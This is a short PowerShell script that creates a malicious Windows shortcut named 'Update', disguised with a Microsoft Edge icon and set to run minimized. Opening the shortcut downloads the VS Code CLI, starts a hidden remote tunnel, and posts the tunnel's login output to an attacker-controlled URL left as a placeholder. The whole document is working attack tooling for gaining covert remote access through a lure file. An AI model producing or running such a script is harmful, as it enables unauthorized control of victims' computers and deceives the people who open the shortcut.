#Payload
$EXEPath = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
$pay = 'cd C:\tmp; iwr -uri https://az764295.vo.msecnd.net/stable/97dec172d3256f8ca4bfb2143f3f76b503ca0534/vscode_cli_win32_x64_cli.zip -OutFile vscode.zip; Expand-Archive vscode.zip; cd vscode; .\code.exe tunnel user logout; Start-Sleep 3; Start-Process -FilePath .\code.exe  -ArgumentList "tunnel","--name","VERSION2" -RedirectStandardOutput  .\output.txt -WindowStyle Hidden; Start-Sleep 3; iwr -uri $FIXME -Method Post -Body (Get-Content .\output.txt)'
$arguments = " -nop -c $pay"

#lnk file
$LNKName = "Update"
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut((Get-Location).Path + "\" + $LNKName + ".lnk")
$link.WindowStyle = '7'
$link.TargetPath = $EXEPath
$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$link.Arguments = $arguments
$link.Save()